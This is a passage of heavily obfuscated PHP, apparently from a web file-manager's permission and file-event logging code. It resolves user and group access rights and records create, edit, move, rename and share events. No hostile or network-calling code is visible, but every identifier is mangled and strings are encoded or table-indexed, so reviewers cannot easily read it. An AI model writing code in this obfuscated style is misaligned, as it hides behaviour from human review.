array_merge($¶Á·¨’ª, $†Ê¨ïÁ ); } $®§ß„¾ = array_values(array_unique($®§ß„¾)); $ÆğÇÇãÎ = array($‘ëöäŞ[2166] => $®§ß„¾, $‘ëöäŞ[2167] => $†ï°­…º); $Ö»ïƒèó[$óš‹áƒ†] = $ÆğÇÇãÎ; return $ÆğÇÇãÎ; } private function makeSourceAuth($õ…ŠªÕ®, $¥Á•¸°µ, $„“ÓöÄ÷ = false) { $Å¸Î´ìˆ =& $_SERVER[Ò°Ì”İ•]; $¡¨üˆú = $Å¸Î´ìˆ[102]; $¸ÖøÉ· = $õ…ŠªÕ®[$Å¸Î´ìˆ[581]]; $×¤Ê¥å¹ = $õ…ŠªÕ®[$Å¸Î´ìˆ[201]] == SourceModel::TYPE_GROUP; $¬ùÂˆ™¡ = $×¤Ê¥å¹ ? $this->groupRootAuth($¸ÖøÉ·, $„“ÓöÄ÷) : !1; if ($¬ùÂˆ™¡ && Model($Å¸Î´ìˆ[583])->authCheckAction($¬ùÂˆ™¡[$Å¸Î´ìˆ[499]], $Å¸Î´ìˆ[1990])) { return $this->groupAuthInfo($¬ùÂˆ™¡, $¸ÖøÉ·); } $ˆÑšÛğŸ = Model($Å¸Î´ìˆ[1417])->parentLevelArray($õ…ŠªÕ®[$Å¸Î´ìˆ[596]]); $ˆÑšÛğŸ = array_merge(array($õ…ŠªÕ®[$Å¸Î´ìˆ[204]]), array_reverse($ˆÑšÛğŸ)); $ûÏŒá = !1; foreach ($ˆÑšÛğŸ as $œ³…ßöı) { if (!isset($¥Á•¸°µ[$œ³…ßöı])) { continue; } $éÁ–­§¨ = $this->authMake($¥Á•¸°µ[$œ³…ßöı], $„“ÓöÄ÷); if ($éÁ–­§¨[$Å¸Î´ìˆ[552]]) { $ûÏŒá = $éÁ–­§¨; break; } } if (!$×¤Ê¥å¹) { return $ûÏŒá; } if (!$ûÏŒá && $¬ùÂˆ™¡) { $ûÏŒá = $this->groupAuthInfo($¬ùÂˆ™¡, $¸ÖøÉ·); } if (!$ûÏŒá) { $“Ì˜øïŠ = Model($Å¸Î´ìˆ[597])->getInfo($¸ÖøÉ·); $‘ß¬´ğö = explode($Å¸Î´ìˆ[50], trim($“Ì˜øïŠ[$Å¸Î´ìˆ[596]], $Å¸Î´ìˆ[50])); $‘ß¬´ğö = array_reverse($‘ß¬´ğö); foreach ($‘ß¬´ğö as $µ–ÂÍ‰) { if ($µ–ÂÍ‰ == $Å¸Î´ìˆ[241] || $µ–ÂÍ‰ == $¡¨üˆú) { continue; } $İ€¯ï‘× = $this->groupRootAuth($µ–ÂÍ‰, $„“ÓöÄ÷); if (!$İ€¯ï‘×) { continue; } $ûÏŒá = $this->groupAuthInfo($İ€¯ï‘×, $µ–ÂÍ‰); break; } } if (!$ûÏŒá || $ûÏŒá[$Å¸Î´ìˆ[500]] <= 0) { $¼Œø¹ªú = $this->authDeepCheck($õ…ŠªÕ®[$Å¸Î´ìˆ[204]], $„“ÓöÄ÷); if ($¼Œø¹ªú) { $ûÏŒá = $¼Œø¹ªú; } } return $ûÏŒá; } private function userIsRoot($ÉûáÆò™ = false) { $Ê×äõÄÙ =& $_SERVER[Ò°Ì”İ•]; if (!$ÉûáÆò™ && KodUser::isRoot()) { return !0; } $£é¢ÏŞ‘ = Model($Ê×äõÄÙ[609])->getInfo($ÉûáÆò™); $°áŠ¶‡³ = Model($Ê×äõÄÙ[2175])->listData($£é¢ÏŞ‘[$Ê×äõÄÙ[2176]]); if ($°áŠ¶‡³ && $°áŠ¶‡³[$Ê×äõÄÙ[587]][$Ê×äõÄÙ[2177]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¾Ù±ƒ„) { $ÃÍÂêì =& $_SERVER[Ò°Ì”İ•]; $ëİ§ ¾Ç = Model($ÃÍÂêì[1417]); $©¤ö‹õ = $ëİ§ ¾Ç->sourceInfo($¾Ù±ƒ„); if (!$©¤ö‹õ) { return !1; } $ëİ§ ¾Ç->groupPathDisplay($©¤ö‹õ); $é‘ºÀ˜Ø = array($©¤ö‹õ); $é‘ºÀ˜Ø = $ëİ§ ¾Ç->_listAppendPath($é‘ºÀ˜Ø); $©¤ö‹õ = $é‘ºÀ˜Ø[0]; $ÒåãêÌø = $©¤ö‹õ[$ÃÍÂêì[594]]; if (isset($©¤ö‹õ[$ÃÍÂêì[602]])) { $Ë¾é‡ Â = explode($ÃÍÂêì[8], trim($©¤ö‹õ[$ÃÍÂêì[594]], $ÃÍÂêì[8])); array_shift($Ë¾é‡ Â); $ÒåãêÌø = $©¤ö‹õ[$ÃÍÂêì[600]] . $ÃÍÂêì[2178] . implode($ÃÍÂêì[8], $Ë¾é‡ Â); } return array($ÃÍÂêì[506] => $©¤ö‹õ[$ÃÍÂêì[32]], $ÃÍÂêì[98] => KodIO::make($©¤ö‹õ[$ÃÍÂêì[204]]), $ÃÍÂêì[2179] => $ÒåãêÌø); } private function groupAuthInfo($äÕ±¤¶ß, $„ø®ıöó) { $²‚ó ©· =& $_SERVER[Ò°Ì”İ•]; $’Åë–Ú = Model($²‚ó ©·[597])->getInfo($„ø®ıöó); return array($²‚ó ©·[2180] => intval($äÕ±¤¶ß[$²‚ó ©·[499]]), $²‚ó ©·[2163] => $äÕ±¤¶ß, $²‚ó ©·[2181] => LNG($²‚ó ©·[2182]), $²‚ó ©·[2172] => array($²‚ó ©·[506] => $’Åë–Ú[$²‚ó ©·[32]], $²‚ó ©·[98] => KodIO::make($’Åë–Ú[$²‚ó ©·[101]][$²‚ó ©·[204]]), $²‚ó ©·[2179] => $’Åë–Ú[$²‚ó ©·[601]])); } protected function groupRootAuth($Ã”¹¦ÆË, $…®×–¿ = false) { $ÛºÈì©– =& $_SERVER[Ò°Ì”İ•]; $…®×–¿ = $…®×–¿ ? $…®×–¿ : USER_ID; $ŞªÆ­÷İ = $…®×–¿ . $ÛºÈì©–[2183] . $Ã”¹¦ÆË; static $Êéë¹õ = array(); if (isset($Êéë¹õ[$ŞªÆ­÷İ])) { return $Êéë¹õ[$ŞªÆ­÷İ]; } $•¦‡×Ÿˆ = Model($ÛºÈì©–[597])->getInfo($Ã”¹¦ÆË); $ŠûŠ…ˆ = $this->userGroupList($…®×–¿); $µÂªõèñ = isset($ŠûŠ…ˆ[$Ã”¹¦ÆË]) ? $ŠûŠ…ˆ[$Ã”¹¦ÆË][$ÛºÈì©–[499]] : !1; if ($µÂªõèñ && Model($ÛºÈì©–[583])->authCheckAction($µÂªõèñ[$ÛºÈì©–[499]], $ÛºÈì©–[1990])) { $Êéë¹õ[$ŞªÆ­÷İ] = $µÂªõèñ; return $µÂªõèñ; } $ÄÆŠÆ = $this->sourceAuthSelect($•¦‡×Ÿˆ[$ÛºÈì©–[101]][$ÛºÈì©–[204]]); $†Ç¥¹ËÔ = $ÄÆŠÆ ? $this->authMake($ÄÆŠÆ, $…®×–¿) : !1; $ˆØêµÕ¨ = $†Ç¥¹ËÔ ? $†Ç¥¹ËÔ[$ÛºÈì©–[552]] : !1; $Êéë¹õ[$ŞªÆ­÷İ] = $ˆØêµÕ¨ ? $ˆØêµÕ¨ : $µÂªõèñ; return $Êéë¹õ[$ŞªÆ­÷İ]; } public function authOwnerApply($€à–ïô—) { $Ä’æÔÎ· =& $_SERVER[Ò°Ì”İ•]; if (empty($€à–ïô—[$Ä’æÔÎ·[499]]) || isset($€à–ïô—[$Ä’æÔÎ·[2184]]) && $€à–ïô—[$Ä’æÔÎ·[2184]]) { return $€à–ïô—; } if (AuthModel::authCheckRoot($€à–ïô—[$Ä’æÔÎ·[499]][$Ä’æÔÎ·[500]])) { return $€à–ïô—; } $¯Ü‚šŠ = Model($Ä’æÔÎ·[1417])->parentLevelArray($€à–ïô—[$Ä’æÔÎ·[596]]); $¯Ü‚šŠ = array_merge(array($€à–ïô—[$Ä’æÔÎ·[204]]), array_reverse($¯Ü‚šŠ)); $¬Í¯­Š = $this->sourceAuthSelect($¯Ü‚šŠ); $øä“ÉØ¾ = array(); $”Æ´Öä = array(); foreach ($¬Í¯­Š as $Ü£Æ¾…ã => $¥»õ·“ƒ) { $–”˜ÌÑ– = $this->authFolderOwnerUser($¥»õ·“ƒ); $øä“ÉØ¾[$Ü£Æ¾…ã] = $–”˜ÌÑ–; $”Æ´Öä = array_merge($”Æ´Öä, $–”˜ÌÑ–[$Ä’æÔÎ·[677]]); if ($–”˜ÌÑ–[$Ä’æÔÎ·[2185]]) { break; } } if (count($”Æ´Öä) == 0) { $”Æ´Öä = $this->authFolderOwnerGroup($€à–ïô—[$Ä’æÔÎ·[581]]); } $”Æ´Öä = array_unique($”Æ´Öä); if (AuthModel::authCheckRoot($€à–ïô—[$Ä’æÔÎ·[499]][$Ä’æÔÎ·[500]])) { $”Æ´Öä[] = USER_ID; } $€à–ïô—[$Ä’æÔÎ·[499]][$Ä’æÔÎ·[2186]] = Model($Ä’æÔÎ·[589])->userListInfo($”Æ´Öä); return $€à–ïô—; } private function authFolderOwnerGroup($†ù„çù‰) { $Áèú½° =& $_SERVER[Ò°Ì”İ•]; $°™€ÔÒİ = Model($Áèú½°[2063])->where(array($Áèú½°[1969] => $†ù„çù‰))->select(); $Ñİ¨öéÎ = array(); if (!$°™€ÔÒİ) { return $Ñİ¨öéÎ; } foreach ($°™€ÔÒİ as $Ôßú¯šÒ) { $Éüúôİ = $this->authInfo($Ôßú¯šÒ); if (AuthModel::authCheckRoot($Éüúôİ[$Áèú½°[499]])) { $Ñİ¨öéÎ[] = $Ôßú¯šÒ[$Áèú½°[1768]]; } } return $Ñİ¨öéÎ; } private function authFolderOwnerUser($Æ–¢”âÂ) { $¦ºĞßïñ =& $_SERVER[Ò°Ì”İ•]; $ÆàğŸ´ˆ = array(); $½¨åÈ¼’ = !1; foreach ($Æ–¢”âÂ as $ïåÙ¦ñÖ) { $…©ÍÛ“à = $this->authInfo($ïåÙ¦ñÖ); if ($ïåÙ¦ñÖ[$¦ºĞßïñ[581]] == $¦ºĞßïñ[241]) { $½¨åÈ¼’ = !0; } if ($ïåÙ¦ñÖ[$¦ºĞßïñ[201]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($…©ÍÛ“à[$¦ºĞßïñ[499]])) { $ÆàğŸ´ˆ[] = $ïåÙ¦ñÖ[$¦ºĞßïñ[581]]; } } } return array($¦ºĞßïñ[677] => $ÆàğŸ´ˆ, $¦ºĞßïñ[2185] => $½¨åÈ¼’); } public function authMake($æü˜££˜, $ƒø¦µË = false) { $Ç³ÈèÛÖ =& $_SERVER[Ò°Ì”İ•]; $æŸÅÏßŠ = $this->authArrayCheck($æü˜££˜, $ƒø¦µË); if ($æŸÅÏßŠ[$Ç³ÈèÛÖ[2187]]) { $æŸÅÏßŠ[$Ç³ÈèÛÖ[2187]] = $this->sourceAuthInfo($æŸÅÏßŠ[$Ç³ÈèÛÖ[2187]]); } return $æŸÅÏßŠ; } public function authArrayCheck($¾–­€Û, $½‡Í°‘Ó = false) { $ÁŠş´Ê« =& $_SERVER[Ò°Ì”İ•]; if (!$¾–­€Û) { return array($ÁŠş´Ê«[500] => 0, $ÁŠş´Ê«[552] => !1); } $½‡Í°‘Ó = $½‡Í°‘Ó ? $½‡Í°‘Ó : USER_ID; $óÏÊÀüœ = 0; $ÜÊãª©Ç = 0; $ÛèÉ£¢ = 0; $öÛÓ±ƒ£ = 0; $Û¶ìÅ„ = 0; $²ÎÓÂ†¥ = 0; $·Õ€Ñ«à = 1000; $Çå è©² = 0; $êãß±²Ú = 0; $²§½Ã–» = 0; $”—ïãÀ´ = 0; $Í‹‚³ŠŞ = array($ÁŠş´Ê«[204] => 0); foreach ($¾–­€Û as $Í‹‚³ŠŞ) { $àØáÀ¸µ = $this->authInfo($Í‹‚³ŠŞ); if (!$àØáÀ¸µ) { continue; } $šÊÉ¯Ä– = $Í‹‚³ŠŞ[$ÁŠş´Ê«[581]]; $û“¿èÛÕ = intval($àØáÀ¸µ[$ÁŠş´Ê«[499]]); if ($Í‹‚³ŠŞ[$ÁŠş´Ê«[201]] == SourceModel::TYPE_USER && $šÊÉ¯Ä– == $½‡Í°‘Ó) { $óÏÊÀüœ = !0; $ÛèÉ£¢ = $àØáÀ¸µ; $ÜÊãª©Ç = $û“¿èÛÕ; } else { if ($Í‹‚³ŠŞ[$ÁŠş´Ê«[201]] == SourceModel::TYPE_GROUP && $this->groupContainUser($šÊÉ¯Ä–, $½‡Í°‘Ó)) { $öÛÓ±ƒ£ = !0; $û‰œ·™ = $this->groupStepToUserGroup($šÊÉ¯Ä–, $½‡Í°‘Ó); if ($û‰œ·™ < $·Õ€Ñ«à) { $·Õ€Ñ«à = $û‰œ·™; $Û¶ìÅ„ = $û“¿èÛÕ; $²ÎÓÂ†¥ = $àØáÀ¸µ; $Çå è©² = $šÊÉ¯Ä–; } if ($û‰œ·™ == $·Õ€Ñ«à && $û“¿èÛÕ >= $Û¶ìÅ„) { $Û¶ìÅ„ = $û“¿èÛÕ; $²ÎÓÂ†¥ = $àØáÀ¸µ; $Çå è©² = $šÊÉ¯Ä–; } } else { if ($šÊÉ¯Ä– == $ÁŠş´Ê«[241]) { $êãß±²Ú = !0; $”—ïãÀ´ = $àØáÀ¸µ; $²§½Ã–» = $û“¿èÛÕ; } } } } if ($óÏÊÀüœ) { $Ô ‡½¯Ç = $ÜÊãª©Ç; $àØáÀ¸µ = $ÛèÉ£¢; $ĞØ©¨¤— = LNG($ÁŠş´Ê«[2188]); } else { if ($öÛÓ±ƒ£) { $Ô ‡½¯Ç = $Û¶ìÅ„; $àØáÀ¸µ = $²ÎÓÂ†¥; $×í€éÜŠ = Model($ÁŠş´Ê«[597])->getInfo($Çå è©²); $ĞØ©¨¤— = $ÁŠş´Ê«[187] . $×í€éÜŠ[$ÁŠş´Ê«[601]] . $ÁŠş´Ê«[2189] . LNG($ÁŠş´Ê«[2190]); } else { if ($êãß±²Ú) { $Ô ‡½¯Ç = $²§½Ã–»; $àØáÀ¸µ = $”—ïãÀ´; $ĞØ©¨¤— = LNG($ÁŠş´Ê«[2160]); } else { $Ô ‡½¯Ç = 0; $àØáÀ¸µ = !1; $ĞØ©¨¤— = $ÁŠş´Ê«[12]; } } } $Ö´¯ÒÇ³ = array($ÁŠş´Ê«[2180] => intval($Ô ‡½¯Ç), $ÁŠş´Ê«[2163] => $àØáÀ¸µ, $ÁŠş´Ê«[2181] => $ĞØ©¨¤—, $ÁŠş´Ê«[2172] => $Í‹‚³ŠŞ[$ÁŠş´Ê«[204]]); return $Ö´¯ÒÇ³; } private function groupContainUser($Ò„õ¹üË, $³êáŸÆØ = false) { return in_array($Ò„õ¹üË, $this->userGroupParents($³êáŸÆØ)); } private function groupStepToUserGroup($êÕò¹¡, $¢üœ–ã¥ = false) { $ãü„ø©× =& $_SERVER[Ò°Ì”İ•]; $Œœ¬‰æì = $this->userGroupList($¢üœ–ã¥); $‡ŸÁè—å = 1000; $Şèê±â› = $GLOBALS[$ãü„ø©×[6]][$ãü„ø©×[103]][$ãü„ø©×[2076]] == 1; $ôÃşÀ‘â = $Şèê±â› ? 3 : 2; foreach ($Œœ¬‰æì as $¨…ô£¬) { if ($¨…ô£¬[$ãü„ø©×[1969]] == $êÕò¹¡) { return 0; } $ü¦ı¤ú = explode($ãü„ø©×[50], trim($¨…ô£¬[$ãü„ø©×[596]], $ãü„ø©×[50])); if ($ü¦ı¤ú[0] == $ãü„ø©×[241] && count($ü¦ı¤ú) > $ôÃşÀ‘â) { $µâúÀõ· = array_reverse(array_slice($ü¦ı¤ú, $ôÃşÀ‘â)); $ÓË¶Õçô = array_search($êÕò¹¡, $µâúÀõ·); if ($ÓË¶Õçô !== !1 && $ÓË¶Õçô + 1 <= $‡ŸÁè—å) { $‡ŸÁè—å = $ÓË¶Õçô + 1; } } } return $‡ŸÁè—å; } private function userGroupList($Øò®“¡ = false) { $ñç£ü»Ñ =& $_SERVER[Ò°Ì”İ•]; static $Ã„åØÑ¼ = array(); if (isset($Ã„åØÑ¼[$Øò®“¡])) { return $Ã„åØÑ¼[$Øò®“¡]; } $ëíˆ¸ãè = Model($ñç£ü»Ñ[609])->getInfo($Øò®“¡); $Ã„åØÑ¼[$Øò®“¡] = array_to_keyvalue($ëíˆ¸ãè[$ñç£ü»Ñ[2161]], $ñç£ü»Ñ[1969]); return $Ã„åØÑ¼[$Øò®“¡]; } public function userGroupParents($ı‚õ÷ú¼) { $—İ–Èœ =& $_SERVER[Ò°Ì”İ•]; static $¿¯ø÷Ï = array(); $ı‚õ÷ú¼ = $ı‚õ÷ú¼ ? $ı‚õ÷ú¼ : USER_ID; if (isset($¿¯ø÷Ï[$ı‚õ÷ú¼])) { return $¿¯ø÷Ï[$ı‚õ÷ú¼]; } $ã˜ï€Õ÷ = $this->userGroupList($ı‚õ÷ú¼); $™º‹çç = array(); $ëÇ½ôÀ‘ = $GLOBALS[$—İ–Èœ[6]][$—İ–Èœ[103]][$—İ–Èœ[2076]] == 1; $ôÅÍâ·œ = $ëÇ½ôÀ‘ ? 3 : 2; foreach ($ã˜ï€Õ÷ as $âº¬–Ç­) { $´‘öáùÏ = array($âº¬–Ç­[$—İ–Èœ[1969]]); $­ÑÓ¶… = explode($—İ–Èœ[50], trim($âº¬–Ç­[$—İ–Èœ[596]], $—İ–Èœ[50])); if ($­ÑÓ¶…[0] == $—İ–Èœ[241] && count($­ÑÓ¶…) > $ôÅÍâ·œ) { $½²ğ®Àü = array_slice($­ÑÓ¶…, $ôÅÍâ·œ); $´‘öáùÏ = array_merge($´‘öáùÏ, array_reverse($½²ğ®Àü)); } $™º‹çç = array_merge($™º‹çç, $´‘öáùÏ); } $¿¯ø÷Ï[$ı‚õ÷ú¼] = array_unique($™º‹çç); return $¿¯ø÷Ï[$ı‚õ÷ú¼]; } public function authTargetInfoMake($Œœ²ÉĞ…) { $ÍÈÍÛÈ =& $_SERVER[Ò°Ì”İ•]; $ÒìÙºöá = array(); $¶İÔÑŸŠ = array(); foreach ($Œœ²ÉĞ… as $Şî¡ÚäÕ) { if ($Şî¡ÚäÕ[$ÍÈÍÛÈ[201]] == SourceModel::TYPE_USER) { $ÒìÙºöá[] = intval($Şî¡ÚäÕ[$ÍÈÍÛÈ[581]]); } else { if ($Şî¡ÚäÕ[$ÍÈÍÛÈ[201]] == SourceModel::TYPE_GROUP) { $¶İÔÑŸŠ[] = intval($Şî¡ÚäÕ[$ÍÈÍÛÈ[581]]); } } } if ($ÒìÙºöá) { $ÒìÙºöá = Model($ÍÈÍÛÈ[589])->userListInfo($ÒìÙºöá); } if ($¶İÔÑŸŠ) { $„àÍÆŞ£ = array($ÍÈÍÛÈ[2061] => array($ÍÈÍÛÈ[504], $¶İÔÑŸŠ)); $¶İÔÑŸŠ = Model($ÍÈÍÛÈ[597])->field($ÍÈÍÛÈ[2191])->where($„àÍÆŞ£)->select(); $¶İÔÑŸŠ = array_to_keyvalue($¶İÔÑŸŠ, $ÍÈÍÛÈ[1969]); } return array($ÍÈÍÛÈ[2192] => $ÒìÙºöá, $ÍÈÍÛÈ[2193] => $¶İÔÑŸŠ); } public function authInfo($·ÄÉÜÏ¨) { $Ô’„Â¯¼ =& $_SERVER[Ò°Ì”İ•]; if ($·ÄÉÜÏ¨[$Ô’„Â¯¼[2077]]) { $ê¶›ÊøŸ = Model($Ô’„Â¯¼[583])->listData($·ÄÉÜÏ¨[$Ô’„Â¯¼[2077]]); if (!$ê¶›ÊøŸ) { return !1; $õı¨Ì£ã = Model($Ô’„Â¯¼[583])->listData(); $œí‰ÉÓß = array_filter_by_field($õı¨Ì£ã, $Ô’„Â¯¼[499], $Ô’„Â¯¼[241]); return $œí‰ÉÓß; } $±şÛÚ¹ = array_field_key($ê¶›ÊøŸ, array($Ô’„Â¯¼[487], $Ô’„Â¯¼[32], $Ô’„Â¯¼[499], $Ô’„Â¯¼[1992], $Ô’„Â¯¼[1993])); $±şÛÚ¹[$Ô’„Â¯¼[2194]] = $·ÄÉÜÏ¨; return $±şÛÚ¹; } else { return array($Ô’„Â¯¼[505] => 0, $Ô’„Â¯¼[1975] => $·ÄÉÜÏ¨[$Ô’„Â¯¼[2138]], $Ô’„Â¯¼[506] => $Ô’„Â¯¼[12], $Ô’„Â¯¼[1992] => $Ô’„Â¯¼[2195]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\162\x63\x65\137\x65\166\145\156\164"; protected $dataAuto = array(array("\143\162\145\x61\164\x65\x54\x69\x6d\145", "\x74\x69\x6d\x65", "\x69\156\x73\145\162\164", "\x66\165\x6e\143\x74\x69\x6f\x6e"), array("\144\x65\163\143", '', "\x69\x6e\163\145\x72\x74\54\165\x70\x64\x61\x74\145\x2c\x73\x65\x6c\145\x63\164", "\x6a\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ş•›ôÑ, $ú÷ú×¡Î, $Ì®÷æ‡ = '') { $‘æ‘„ =& $_SERVER[Ò°Ì”İ•]; if (!$this->eventSave) { return; } $«ÑÖôÀ  = Model($‘æ‘„[1417])->sourceInfo($ş•›ôÑ); if (!$«ÑÖôÀ ) { return !1; } if ($this->isDisableEvent($«ÑÖôÀ , $ú÷ú×¡Î)) { return; } if ($Ì®÷æ‡ && is_string($Ì®÷æ‡)) { $Ì®÷æ‡ = array($‘æ‘„[2008] => $Ì®÷æ‡); } $šõÂÛ¿¹ = defined($‘æ‘„[2196]) ? USER_ID : 0; $˜Ùİæ‡Ş = array($‘æ‘„[503] => $ş•›ôÑ, $‘æ‘„[2197] => $«ÑÖôÀ [$‘æ‘„[203]], $‘æ‘„[2198] => $«ÑÖôÀ [$‘æ‘„[32]], $‘æ‘„[594] => !empty($«ÑÖôÀ [$‘æ‘„[594]]) ? $«ÑÖôÀ [$‘æ‘„[594]] : $‘æ‘„[12], $‘æ‘„[1759] => $šõÂÛ¿¹, $‘æ‘„[508] => $ú÷ú×¡Î, $‘æ‘„[1761] => $Ì®÷æ‡); $this->addSystemLog($ú÷ú×¡Î, $˜Ùİæ‡Ş); unset($˜Ùİæ‡Ş[$‘æ‘„[2198]], $˜Ùİæ‡Ş[$‘æ‘„[594]]); return $this->add($˜Ùİæ‡Ş); } private function addSystemLog($ÖÀè¿ˆ”, $¯ƒ² ªŸ) { $µ”›İ =& $_SERVER[Ò°Ì”İ•]; if ($ÖÀè¿ˆ” == $µ”›İ[2199]) { $ÖÀè¿ˆ” = $¯ƒ² ªŸ[$µ”›İ[538]][$µ”›İ[2200]]; } else { if (in_array($ÖÀè¿ˆ”, array($µ”›İ[1948], $µ”›İ[2201]))) { $ÖÀè¿ˆ” = $¯ƒ² ªŸ[$µ”›İ[538]][$µ”›İ[182]]; } } $êÜ²×ó = array_merge($¯ƒ² ªŸ, array($µ”›İ[2202] => $¯ƒ² ªŸ[$µ”›İ[204]], $µ”›İ[2203] => $¯ƒ² ªŸ[$µ”›İ[2203]])); Hook::trigger($µ”›İ[2204], $µ”›İ[2205] . $ÖÀè¿ˆ”, $¯ƒ² ªŸ); Model($µ”›İ[1912])->addLog($µ”›İ[2205] . $ÖÀè¿ˆ”, $êÜ²×ó); } private function isDisableEvent($ú…í­¥´, $Û¼¶›Øû) { $–Œ×•ê =& $_SERVER[Ò°Ì”İ•]; if ($ú…í­¥´[$–Œ×•ê[201]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($Û¼¶›Øû == $–Œ×•ê[1937]) { return !1; } return !0; } public function eventCreate($ÂŞÊŸó½, $•Â‰ãë) { $ãìÕåÂ– =& $_SERVER[Ò°Ì”İ•]; $¨µàûŞ€ = Model($ãìÕåÂ–[1417])->sourceInfo($ÂŞÊŸó½); $úğ»»Ø… = array($ãìÕåÂ–[2200] => $•Â‰ãë, $ãìÕåÂ–[32] => $¨µàûŞ€[$ãìÕåÂ–[32]]); return $this->addEvent($ÂŞÊŸó½, $ãìÕåÂ–[2199], $úğ»»Ø…); } public function eventFileEdit($ÉÚöÍ‰) { $ˆ¾–ü“ =& $_SERVER[Ò°Ì”İ•]; $—ÓÑóÛ = array($ˆ¾–ü“[2206] => $_SERVER[$ˆ¾–ü“[2207]], $ˆ¾–ü“[2208] => strtolower(ACTION)); if (isset($GLOBALS[$ˆ¾–ü“[7]][$ˆ¾–ü“[2209]])) { $—ÓÑóÛ[$ˆ¾–ü“[2209]] = $ˆ¾–ü“[102]; } return $this->addEvent($ÉÚöÍ‰, $ˆ¾–ü“[1938], $—ÓÑóÛ); } public function eventRecycle($ ¦®±ö¬, $¶ƒåôì¯) { return $this->addEvent($ ¦®±ö¬, $_SERVER[Ò°Ì”İ•][2201], $¶ƒåôì¯); } private static $_removeLast = ''; public function eventRemove($ÑÓùÁú³) { $–î¸à³« =& $_SERVER[Ò°Ì”İ•]; self::$_removeLast = $ÑÓùÁú³; $ü‡©èËğ = Model($–î¸à³«[1417])->sourceInfo($ÑÓùÁú³); $¸òç’¬è = array_field_key($ü‡©èËğ, array($–î¸à³«[204], $–î¸à³«[553], $–î¸à³«[517], $–î¸à³«[596])); $¾Â¥ÖŒ­ = array($–î¸à³«[182] => $ü‡©èËğ[$–î¸à³«[32]], $–î¸à³«[2208] => ACTION, $–î¸à³«[2210] => $¸òç’¬è); return $this->addEvent($ü‡©èËğ[$–î¸à³«[203]], $–î¸à³«[1937], $¾Â¥ÖŒ­); } public function eventShare($£¬ª†äÈ, $°Âß™è) { return $this->addEvent($£¬ª†äÈ, $_SERVER[Ò°Ì”İ•][1948], $°Âß™è); } public function eventMove($Á¤º§ƒß, $½€—˜é, $úµ¬»ê) { $òêÃ§´‡ =& $_SERVER[Ò°Ì”İ•]; if (self::$_removeLast == $Á¤º§ƒß) { return; } $£ø©²´î = Model($òêÃ§´‡[1417]); $ëˆ¿•Œë = $£ø©²´î->sourceInfo($Á¤º§ƒß); $€°¶Ú´  = $£ø©²´î->sourceInfo($½€—˜é); $ªè²ÊœÏ = $£ø©²´î->sourceInfo($úµ¬»ê); $’è„È¾ó = array($òêÃ§´‡[1237] => $½€—˜é, $òêÃ§´‡[2211] => $€°¶Ú´ [$òêÃ§´‡[32]], $òêÃ§´‡[2187] => !empty($€°¶Ú´ [$òêÃ§´‡[594]]) ? $€°¶Ú´ [$òêÃ§´‡[594]] : $òêÃ§´‡[12], $òêÃ§´‡[1238] => $úµ¬»ê, $òêÃ§´‡[2212] => $ªè²ÊœÏ[$òêÃ§´‡[32]], $òêÃ§´‡[2213] => !empty($ªè²ÊœÏ[$òêÃ§´‡[594]]) ? $ªè²ÊœÏ[$òêÃ§´‡[594]] : $òêÃ§´‡[12]); $this->addEvent($Á¤º§ƒß, $òêÃ§´‡[635], $’è„È¾ó); $ëˆ¿•Œë = $£ø©²´î->sourceInfo($Á¤º§ƒß); $’è„È¾ó = array($òêÃ§´‡[204] => $ëˆ¿•Œë[$òêÃ§´‡[204]], $òêÃ§´‡[32] => $ëˆ¿•Œë[$òêÃ§´‡[32]]); $this->addEvent($½€—˜é, $òêÃ§´‡[2214], $’è„È¾ó); } public function eventCopy($‹²ÜÓÍ) { $this->eventCreate($‹²ÜÓÍ, $_SERVER[Ò°Ì”İ•][633]); } public function eventRename($İ¼˜Ï¼Ç, $ŒÚêĞä€, $äû„µÍ) { $ê¤ËâÌ³ =& $_SERVER[Ò°Ì”İ•]; $ÕÊ¹êı´ = array($ê¤ËâÌ³[1237] => $ŒÚêĞä€, $ê¤ËâÌ³[1238] => $äû„µÍ); return $this->addEvent($İ¼˜Ï¼Ç, $ê¤ËâÌ³[1431], $ÕÊ¹êı´); } public function eventAddComment($˜•¾»÷ò, $ÄĞëøû¿) { return $this->addEvent($˜•¾»÷ò, $_SERVER[Ò°Ì”İ•][2215], $ÄĞëøû¿); } public function eventAddDesc($”¦¢Š—ù, $º®†ç²) { return $this->addEvent($”¦¢Š—ù, $_SERVER[Ò°Ì”İ•][2216], $º®†ç²); } public function listBySource($†»ëæßè) { $åÒ¬Š÷‚ =& $_SERVER[Ò°Ì”İ•]; $»¸Ç˜²÷ = Model($åÒ¬Š÷‚[1417])->sourceInfo($†»ëæßè); $İĞ¿¶ûä = array($åÒ¬Š÷‚[503] => $†»ëæßè); if ($»¸Ç˜²÷[$åÒ¬Š÷‚[497]] == $åÒ¬Š÷‚[102]) { $Ş˜ëÁ¼ñ = Model($åÒ¬Š÷‚[1417])->listSearchChildren($†»ëæßè, 20000); $Ş˜ëÁ¼ñ[] = $†»ëæßè . $åÒ¬Š÷‚[466]; $İĞ¿¶ûä = array($åÒ¬Š÷‚[204] => array($åÒ¬Š÷‚[7], $Ş˜ëÁ¼ñ)); } $Ô§ÄşÁ = $this->where($İĞ¿¶ûä)->order($åÒ¬Š÷‚[2217])->selectPage(); if ($Ô§ÄşÁ[$åÒ¬Š÷‚[454]][$åÒ¬Š÷‚[455]] == 0) { $Ô§ÄşÁ[$åÒ¬Š÷‚[454]][$åÒ¬Š÷‚[455]] = 1; $Ô§ÄşÁ[$åÒ¬Š÷‚[457]] = array(array($åÒ¬Š÷‚[503] => $†»ëæßè, $åÒ¬Š÷‚[2197] => $»¸Ç˜²÷[$åÒ¬Š÷‚[203]], $åÒ¬Š÷‚[1759] => $»¸Ç˜²÷[$åÒ¬Š÷‚[539]], $åÒ¬Š÷‚[508] => $åÒ¬Š÷‚[2218], $åÒ¬Š÷‚[509] => $»¸Ç˜²÷[$åÒ¬Š÷‚[244]], $åÒ¬Š÷‚[1761] => $åÒ¬Š÷‚[12])); } return $this->eventListParse($Ô§ÄşÁ, $†»ëæßè); } private function eventListParse($Î›»êà·, $Íóåò¡) { $Û¶è³¼ =& $_SERVER[Ò°Ì”İ•]; $„ÖºèÕ = $Î›»êà·[$Û¶è³¼[457]]; 